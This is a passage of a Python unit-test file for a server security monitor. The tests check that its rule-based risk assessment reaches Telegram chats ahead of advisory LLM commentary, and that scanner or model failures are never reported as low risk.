        return [call.args[1] for call in send.call_args_list]

    def test_local_on_demand_scan_sends_assessment_then_advisory(self):
        with (
            mock.patch.object(monitor, "collect_local", return_value=findings(MIXED)) as collect,
            mock.patch.object(monitor, "send_message") as send,
            mock.patch.object(llm_analyzer, "analyze_with_bedrock",
                              new=_async("### FINDINGS\nall expected")),
        ):
            monitor.cmd_security("-1001", self.instance)

        self.assertEqual(collect.call_args.args[0], "AURORA")
        self.assertEqual(collect.call_args.args[1], {})
        texts = "\n".join(self.messages(send))
        self.assertIn("Risk: `MEDIUM`", texts)
        self.assertIn("advisory only", texts)
        self.assertIn("suspicious", texts)
        self.assertIn("expected", texts)
        self.assertLess(texts.index("Risk: `MEDIUM`"), texts.index("advisory only"))
        for call in send.call_args_list:
            self.assertEqual(call.args[0], "-1001")
        for message in self.messages(send):
            self.assertLessEqual(len(message), llm_analyzer.TELEGRAM_MAX_MESSAGE)

    def test_remote_on_demand_scan_uses_the_same_assessment(self):
        with (
            mock.patch.object(monitor, "collect_remote", return_value=findings(MIXED)) as collect,
            mock.patch.object(monitor, "send_message") as send,
            mock.patch.object(llm_analyzer, "analyze_with_bedrock",
                              new=_async("### RISK RATING\n✅ LOW\n")),
        ):
            monitor.cmd_security("-1002", self.remote)

        self.assertIs(collect.call_args.args[0], self.remote)
        texts = "\n".join(self.messages(send))
        self.assertIn("Risk: `MEDIUM`", texts)
        self.assertIn("model opinion, advisory only", texts)

    def test_model_exception_still_delivers_the_authoritative_assessment(self):
        with (
            mock.patch.object(monitor, "collect_local", return_value=findings(MIXED)),
            mock.patch.object(monitor, "send_message") as send,
            mock.patch.object(llm_analyzer, "analyze_with_bedrock",
                              new=_async(RuntimeError("bedrock unavailable"))),
        ):
            monitor.cmd_security("-1001", self.instance)

        texts = "\n".join(self.messages(send))
        self.assertIn("Risk: `MEDIUM`", texts)
        self.assertIn("bedrock unavailable", texts)
        self.assertIn("complete and unaffected", texts)

    def test_model_error_string_is_not_treated_as_a_report(self):
        error_text = "❌ Bedrock analysis failed: throttled"
        with (
            mock.patch.object(monitor, "collect_local", return_value=findings(MIXED)),
            mock.patch.object(monitor, "send_message") as send,
            mock.patch.object(llm_analyzer, "analyze_with_bedrock",
                              new=_async(error_text)),
        ):
            monitor.cmd_security("-1001", self.instance)

        texts = "\n".join(self.messages(send))
        self.assertIn("Risk: `MEDIUM`", texts)
        self.assertIn("AI analysis unavailable", texts)
        self.assertNotIn("AI commentary — advisory only", texts)

    def test_scanner_failure_never_reports_low(self):
        failed = findings([], error="SSH unreachable", scan_status="failed")
        with (
            mock.patch.object(monitor, "collect_remote", return_value=failed),
            mock.patch.object(monitor, "send_message") as send,
            mock.patch.object(llm_analyzer, "analyze_with_bedrock",
                              new=_async("### RISK RATING\n✅ LOW\nall clear\n")),
        ):
            monitor.cmd_security("-1002", self.remote)

        texts = "\n".join(self.messages(send))
        self.assertIn("Risk: `", texts)
        self.assertNotIn("Risk: `NEGLIGIBLE`", texts)
        self.assertIn("SSH unreachable", texts)
        self.assertIn("model opinion, advisory only", texts)

    def test_nightly_job_matches_the_on_demand_assessment(self):
        old_instances = monitor.INSTANCES
        monitor.INSTANCES = [self.instance]
        try:
            with (
                mock.patch.object(monitor, "collect_local", return_value=findings(MIXED)),
                mock.patch.object(monitor, "send_message") as nightly,
                mock.patch.object(monitor, "now_ph", return_value=_timestamp()),
                mock.patch.object(llm_analyzer, "analyze_with_bedrock",
                                  new=_async(RuntimeError("bedrock unavailable"))),
            ):
                monitor.run_nightly_security_analysis()
                on_demand = mock.Mock()
                with (
                    mock.patch.object(monitor, "collect_local", return_value=findings(MIXED)),
                    mock.patch.object(monitor, "send_message", on_demand),
                    mock.patch.object(monitor, "now_ph", return_value=_timestamp()),
                    mock.patch.object(llm_analyzer, "analyze_with_bedrock",
                                      new=_async(RuntimeError("bedrock unavailable"))),
                ):
                    monitor.cmd_security("-1001", self.instance)
        finally:
            monitor.INSTANCES = old_instances

        nightly_assessment = next(
            message for message in self.messages(nightly) if "Authoritative assessment" in message)
        on_demand_assessment = next(
            message for message in self.messages(on_demand) if "Authoritative assessment" in message)
        self.assertEqual(nightly_assessment, on_demand_assessment)
        for call in nightly.call_args_list:
            self.assertEqual(call.args[0], "-1001")

    def test_nightly_job_reports_each_instance_to_its_own_chat(self):
        old_instances = monitor.INSTANCES
        monitor.INSTANCES = [self.instance, self.remote]
        try:
            with (
                mock.patch.object(monitor, "collect_local", return_value=findings(MIXED)),
                mock.patch.object(monitor, "collect_remote", return_value=findings(MIXED)),
                mock.patch.object(monitor, "send_message") as send,
                mock.patch.object(llm_analyzer, "analyze_with_bedrock",
                                  new=_async("### FINDINGS\nok")),
            ):
                monitor.run_nightly_security_analysis()
        finally:
            monitor.INSTANCES = old_instances

        chats = {call.args[0] for call in send.call_args_list}
        self.assertEqual(chats, {"-1001", "-1002"})
        for chat in ("-1001", "-1002"):
            texts = "\n".join(call.args[1] for call in send.call_args_list
                              if call.args[0] == chat)
            self.assertIn("Risk: `MEDIUM`", texts)

    def test_legacy_unreachable_fixture_is_never_reported_as_clean(self):
        legacy = {
            "instance": "prod-db-03", "mode": "remote", "collected": "2026-06-25 09:00:00",
            "error": "SSH connection timed out",
            "processes": {"high_cpu": [], "high_mem": [], "suspicious_name": [],
                          "suspicious_path": [], "zombies": []},
            "network": {"unexpected_listening": [], "external_connections": []},
            "users": {"logged_in": []}, "files": {"recently_modified_system": []},
            "services": {"failed": [], "new_units": []}, "cron": {"entries": []},
            "auth_log": [],
        }
        text = "\n".join(llm_analyzer.format_assessment(legacy, "TS"))

        self.assertIn("SSH connection timed out", text)
        self.assertIn("Risk: `", text)
        self.assertNotIn("Risk: `NEGLIGIBLE`", text)
        self.assertIn("no socket evidence was collected", text)


def _async(value):
    async def coroutine(findings):
        if isinstance(value, Exception):
            raise value
        return value
    return coroutine


def _timestamp():
    from datetime import datetime
    return datetime(2026, 9, 29, 12, 0, 0, tzinfo=monitor.PH_TZ)


if __name__ == "__main__":
    unittest.main()
